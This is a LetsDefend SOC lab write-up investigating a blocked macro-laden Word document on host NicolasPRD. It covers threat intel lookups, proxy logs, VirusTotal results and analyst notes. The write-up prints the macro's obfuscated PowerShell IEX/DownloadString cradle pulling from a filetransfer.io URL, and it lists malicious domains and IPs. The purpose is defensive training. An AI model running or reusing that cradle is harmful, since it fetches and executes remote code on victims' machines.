Our investigation starts here with a medium-severity **LetsDefend SOC Alert: SOC137 - Malicious File/Script Download Attempt**. This is a **Malware** alert, so I’m going to be looking for suspicious files, endpoint activity, and any behavior that may indicate malware execution or compromise.

To begin the investigation, I've created a case for the alert and I'll work through the provided playbook.


## Playbook Step 1: Define Threat Indicator

The first step of the playbook asks me to define the threat indicator related to the alert. Since this is a malware alert, I need to identify what suspicious indicator is associated with the detection before making any decisions.

For this step, I’m going to review the alert details and determine which indicator is most relevant to the investigation, such as a suspicious file, file hash, process, or other malware-related artifact.

After expanding the original alert, I’ve been able to review the available details and identify the indicator that triggered the malware detection. 

<img width="1008" height="621" alt="image" src="https://github.com/user-attachments/assets/a4060ee0-8c4c-42ff-961b-e16ec2894b6d" />

After expanding the alert, I identified the main details tied to the malware detection. The alert involved the host `NicolasPRD` with the source address `172.16.17.37`. The file involved was named `INVOICE PACKAGE LINK TO DOWNLOAD.docm`, and the file hash was:

`f2d0c66b801244c059f636d08a474079`

The file size was listed as `16.66 KB`, and the device action was `Blocked`, meaning the file was blocked by the security control.

I first searched the file hash in Threat Intelligence, but I did not find any results. I also searched Email Security for references to `INVOICE PACKAGE LINK TO DOWNLOAD.docm` to check whether the file may have been delivered through an email attachment, but I did not find any related emails or attachments that pertained to `NicolasPRD`.

Next, I checked Endpoint Security for activity on `NicolasPRD`. There were no process entries, network actions, or browser history recorded, but the terminal history contained several commands dated `March 7, 2021`, roughly one week before the alert fired on `March 14, 2021`.

The commands included host and account reconnaissance (`whoami`, `hostname`, `net user`, `tasklist`), an obfuscated PowerShell command using `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, and a base64-encoded compressed payload, the same command launched through `wmic process call create`, and `rundll32.exe` executing a DLL from `AppData\Local\Temp` with `DllRegisterServer`.

Because these commands were run a week before the alert and no telemetry existed within the alert timeframe, I could not confirm execution of `INVOICE PACKAGE LINK TO DOWNLOAD.docm` from EDR evidence. However, the terminal history indicates prior suspicious activity on this host that warrants further investigation.

<img width="973" height="680" alt="image" src="https://github.com/user-attachments/assets/9b613cf2-937c-48bf-b102-927406ae2cf1" />

I then searched Log Management for activity from the source address `172.16.17.37` and found three related `Proxy` logs, all dated `March 7, 2021`, between 05:50 and 05:54.

The first showed `powershell.exe` connecting to `49.51.12.195` on port `443`, requesting `iluuryeqa.info`. VirusTotal flagged the domain `15/91` malicious with a `dga` tag, indicating it was generated by a Domain Generation Algorithm rather than registered normally.

The second showed `iexplore.exe` connecting to `31.214.157.60` on port `80`, requesting a long randomized URL on `ueba6ka.club` ending in `.avi`. VirusTotal flagged the URL `10/92` malicious.

The third showed `iexplore.exe` requesting `http://ueba6ka.club/favicon.ico` from `49.51.12.195` on port `80`. VirusTotal flagged this URL `9/92` malicious.

All three had a device action of `Allowed`. These logs are dated the same day as the terminal history reviewed earlier, and the `powershell.exe` connection to a DGA domain aligns with the obfuscated PowerShell command found in that history. This indicates prior successful malicious activity on `NicolasPRD` that is separate from, and predates, the March 14 alert.

<img width="1262" height="913" alt="image" src="https://github.com/user-attachments/assets/f08c9720-d7e6-4a4f-94cc-522de1a15677" />

I then analyzed the file hash from the alert on VirusTotal, where it was flagged by `41/65` security vendors as malicious. The popular threat label was `trojan.w97m/sagent`, with threat categories of trojan and downloader.

Code Insights identified an `AutoOpen` macro in the `NewMacros.bas` module that uses the `Shell` function to execute a PowerShell command downloading a file from a remote URL, which is then invoked. Crowdsourced AI analysis from ByteDefend Cyber Lab and Hispasec both independently flagged the file as malicious for the same behavior. 

For the threat indicator, I selected **Unknown or unexpected outgoing internet traffic**.

<img width="1136" height="883" alt="image" src="https://github.com/user-attachments/assets/4d422b51-edcd-4047-b3c0-20fc2c5daaf4" />

The behavior results showed that the document's `AutoOpen` macro launched PowerShell, which made an outbound HTTPS connection to `filetransfer.io` at `172.67.152.246` on port `443`. The command was obfuscated using backtick escapes and string concatenation to break up `IEX`, `New-Object`, and `DownloadString`, which indicates a deliberate attempt to evade signature-based detection:

`powershell I`EX ((n`e`W`-Obj`E`c`T ('Net'+'.'+'Webc'+'lient')).('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'s'+'tri'+'n'+'g')).InVokE('https://filetransfer.io/data-package/UR2whuBv/download')`

A Word document spawning PowerShell to retrieve a file from an external file-sharing service is not expected behavior and represents unauthorized outbound traffic initiated without user awareness. The MITRE mapping supports this with User Execution (`T1204`), Command and Scripting Interpreter: PowerShell (`T1059.001`), Exploitation for Client Execution (`T1203`), and Encrypted Channel (`T1573`).


## Playbook Step 2: Check Whether the Malware Was Quarantined or Cleaned

The next step of the playbook asks me to determine whether the detected malware was quarantined or removed from the affected endpoint. To verify this, I need to review Log Management and Endpoint Security for evidence that the file was blocked, quarantined, deleted, or otherwise cleaned by a security control.

<img width="800" height="417" alt="image" src="https://github.com/user-attachments/assets/7d0d0e77-4704-4615-ac8b-dc2b6565489d" />

The original alert showed a device action of `Blocked`, meaning `INVOICE PACKAGE LINK TO DOWNLOAD.docm` never reached `NicolasPRD`. Endpoint Security also showed no process, network, or browser activity during the alert timeframe, which lines up with the download being stopped rather than executed. Since the file was blocked, I selected **Quarantined** in the playbook.


## Playbook Step 3: Analyze Malware

The next step of the playbook asks me to analyze the file using third-party malware analysis tools and determine whether it is malicious. It also asks me to review the results for any command-and-control addresses or other suspicious network indicators.

<img width="796" height="482" alt="image" src="https://github.com/user-attachments/assets/bb9ea680-3711-40bb-813c-32839880390b" />

Based on the VirusTotal results reviewed earlier, a `41/65` detection rate, a `trojan.w97m/sagent` threat label with categories of trojan and downloader, and Code Insights showing an `AutoOpen` macro that uses `Shell` to launch an obfuscated PowerShell download command, the file showed strong evidence of malicious behavior. The MITRE ATT&CK mapping reinforced this with User Execution (`T1204`), PowerShell (`T1059.001`), Exploitation for Client Execution (`T1203`), and Encrypted Channel (`T1573`).

Because of this, I selected **Malicious** in the playbook.


## Playbook Step 4: Check Whether the C2 Address Was Accessed

## Playbook Step 6: Analyst Notes

The next step of the playbook asks me to add analyst notes for the case. I used this section to summarize the main findings from the investigation, including the flagged file, the macro behavior identified in analysis, whether the download succeeded, and the prior activity found on the host.

<img width="798" height="510" alt="image" src="https://github.com/user-attachments/assets/8efe0cdd-e6bb-45a2-9893-58cec5ea7d53" />

**Analyst Note:** On `Mar. 14, 2021, at 07:15 PM`, the system detected a malicious file download attempt on the internal endpoint `NicolasPRD` at `172.16.17.37`. The file was named `INVOICE PACKAGE LINK TO DOWNLOAD.docm`, with the MD5 hash `f2d0c66b801244c059f636d08a474079`. The device action was `Blocked`, meaning the file never reached the endpoint.

VirusTotal flagged the file `41/65` malicious with a threat label of `trojan.w97m/sagent` and categories of trojan and downloader. Code Insights identified an `AutoOpen` macro in the `NewMacros.bas` module that uses the `Shell` function to launch PowerShell and download a remote file. The PowerShell command was obfuscated with backtick escapes and string concatenation to break up `IEX`, `New-Object`, and `DownloadString`, and pointed to `https://filetransfer.io/data-package/UR2whuBv/download`.

The MITRE ATT&CK mappings covered User Execution (`T1204`), Exploitation for Client Execution (`T1203`), Command and Scripting Interpreter: PowerShell (`T1059.001`), Application Layer Protocol (`T1071`), and Encrypted Channel (`T1573`). I selected `Unknown or unexpected outgoing internet traffic` as the threat indicator, since a Word document spawning PowerShell to retrieve a file from an external file-sharing service is not expected behavior.

Endpoint Security showed no process, network, or browser activity during the alert timeframe, and Log Management returned no traffic from `172.16.17.37` to `172.67.152.246`. Since the download was blocked and the endpoint never contacted the address, I assessed the C2 address as not accessed.

However, Endpoint Security and Log Management both showed prior suspicious activity on this host dated `Mar. 7, 2021`, a week before the alert. Terminal history contained suspicious obfuscated PowerShell commands using `-ExecutionPolicy Bypass` and `-WindowStyle Hidden`, the same command launched via `wmic process call create`, and `rundll32.exe` executing a DLL from `AppData\Local\Temp`. Three proxy logs from the same day showed `powershell.exe` contacting the DGA domain `iluuryeqa.info` (`15/91` on VirusTotal) and `iexplore.exe` contacting two malicious URLs on `ueba6ka.club` (`10/92` and `9/92`), all with a device action of `Allowed`.

Based on the VirusTotal detections and the confirmed macro behavior, I assessed `INVOICE PACKAGE LINK TO DOWNLOAD.docm` as malicious. The download itself was blocked and no C2 contact occurred, but the March 7 activity indicates a prior successful compromise on this host that warrants separate investigation. 


## Playbook Step 7: Review and Submit

The final playbook step was to confirm the investigation and close the case. At this point, I had already analyzed the malware, checked whether it was quarantined and whether the C2 address was accessed, added the relevant artifacts, and summarized my findings into the analyst notes, so the remaining step was to select the final verdict and submit.
